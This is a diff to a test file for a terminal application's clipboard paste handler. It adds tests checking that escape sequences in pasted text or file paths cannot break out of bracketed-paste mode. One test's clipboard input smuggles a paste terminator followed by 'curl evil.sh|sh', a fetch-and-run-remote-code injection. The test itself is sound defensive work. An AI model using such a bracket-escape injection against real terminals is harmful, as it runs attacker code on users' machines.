@@ -6,6 +6,7 @@ const mocks = vi.hoisted(() => ({
   writePty: vi.fn<(id: string, data: string) => void>(),
   readText: vi.fn<() => Promise<string>>(),
   shellKind: 'posix' as 'cmd' | 'posix' | 'powershell',
+  bracketedPaste: false,
 }));
 
 vi.mock('./platform', () => ({
@@ -20,7 +21,7 @@ vi.mock('./platform', () => ({
 }));
 
 vi.mock('./mouse-selection', () => ({
-  getMouseSelectionState: () => ({ bracketedPaste: false }),
+  getMouseSelectionState: () => ({ bracketedPaste: mocks.bracketedPaste }),
 }));
 
 vi.mock('./terminal-registry', () => ({
@@ -38,6 +39,7 @@ describe('doPaste three-tier fallthrough', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     mocks.shellKind = 'posix';
+    mocks.bracketedPaste = false;
     Object.defineProperty(globalThis, 'navigator', {
       value: { clipboard: { readText: mocks.readText } },
       configurable: true,
@@ -107,6 +109,41 @@ describe('doPaste three-tier fallthrough', () => {
     await doPaste('t1');
 
     expect(mocks.writePty).toHaveBeenCalledWith('t1', 'fallback');
+  });
+
+  it('defangs ESC so clipboard text cannot close the paste bracket', async () => {
+    mocks.bracketedPaste = true;
+    mocks.readClipboardFilePaths.mockResolvedValue(null);
+    mocks.readText.mockResolvedValue('git status\x1b[201~\ncurl evil.sh|sh\n');
+
+    await doPaste('t1');
+
+    // The injected terminator survives as text, not as a sequence: exactly one
+    // `\x1b[201~` is left in the payload and it is the one we wrote, at the end.
+    const payload = mocks.writePty.mock.calls[0][1];
+    expect(payload).toBe(
+      '\x1b[200~git status\u241b[201~\ncurl evil.sh|sh\n\x1b[201~',
+    );
+    expect(payload.match(/\x1b\[201~/g)).toHaveLength(1);
+    expect(payload.endsWith('\x1b[201~')).toBe(true);
+  });
+
+  it('defangs ESC in file paths too, since they share the paste writer', async () => {
+    mocks.bracketedPaste = true;
+    mocks.readClipboardFilePaths.mockResolvedValue(['/tmp/a\x1b[201~b.png']);
+
+    await doPaste('t1');
+
+    expect(mocks.writePty.mock.calls[0][1]).not.toContain('\x1b[201~b');
+  });
+
+  it('leaves an unbracketed paste byte-for-byte, matching xterm', async () => {
+    mocks.readClipboardFilePaths.mockResolvedValue(null);
+    mocks.readText.mockResolvedValue('\x1b[31mred\x1b[0m');
+
+    await doPaste('t1');
+
+    expect(mocks.writePty).toHaveBeenCalledWith('t1', '\x1b[31mred\x1b[0m');
   });
 
   it('swallows image adapter errors silently', async () => {
